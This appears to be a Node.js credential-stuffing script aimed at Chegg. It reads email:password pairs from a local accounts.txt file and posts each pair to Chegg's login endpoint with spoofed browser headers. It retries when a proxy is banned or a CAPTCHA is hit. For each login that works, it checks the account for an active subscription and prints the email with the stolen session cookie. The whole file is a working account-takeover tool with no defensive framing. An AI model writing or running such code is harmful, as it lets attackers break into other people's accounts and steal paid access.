var fetch = require('node-fetch');
const querystring = require('querystring');
const fs = require('fs')
function main(email,password){
    let fixeduser = querystring.stringify({email: email});
    let fixedpass = querystring.stringify({password: password});
    fetch('https://auth.chegg.com/_ajax/auth/v1/login?clientId=CW', {
    method: 'POST',
    headers: {
        'Host': 'auth.chegg.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'sec-gpc': '1',
        'origin': 'https://www.chegg.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.chegg.com/',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'Cookie': ''
    },
    body: 'clientId=CW&redirect_uri=https%3A%2F%2Fwriting.chegg.com%2Fapi%2Fauth%2Foauth%2Fchegg&state=&responseType=code&'+fixeduser+'&'+fixedpass+'&version=2.124.51&profileId=CW'
})
.then(res => {
    res.json()

    try {
        let id_token = res.headers.raw()['set-cookie']['6'].split(';')[0]
        //console.log(email)
        checkSub(id_token,email,password)
        //let su = res.headers.raw()['set-cookie']['10'].split(';')[0]
        //let session = res.headers.raw()['set-cookie']['0'].split(';')[0]
        //let session = (session1.split('=')[1])
        //getToken(id_token,su,session)
        
    } catch (error) {
        if(res.status === 403){
            //console.log('Proxy Banned Retrying')

            main(email,password)
        } else {
            console.log('Bad Login most likely for account : '+email)
        }
    }

})
}

function checkSub(id_token,email,password){


    fetch('https://www.chegg.com/my/_ajax/account/activity/v2', {
        headers: {
            'Host': 'www.chegg.com',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
            'sec-gpc': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.chegg.com/my/account',
            'accept-language': 'en-US,en;q=0.9',
            'Cookie': id_token
        },
        follow: 20,         // maximum redirect count. 0 to not follow redirect
        timeout: 0,  
    })    
    .then(res => res.json())
    .then(json => {
        
        try {
            json.result.forEach(item => {
                console.log(item)
                if(item.itemAttr.subscriptionStatus==='active'){
                    console.log('Chegg Account is good : '+ email)
                    console.log(id_token)
                }
            })
        } catch (error) {

            if(json.appId.length>0){
                console.log('Hit PX CAPTCHA on account : '+email)
                main(email,password)


            } else {
                console.log('ATTR ERROR')
            }
            
        }
    });
    
}



let x = 0
let y = 200
while(x<=y){
    const account = fs.readFileSync('./accounts.txt').toString().split('\n')
    let email = account[x].split(':')[0]
    let password = account[x].split(':')[1]
    //console.log(email+':'+password)
    main(email,password)
    x++
}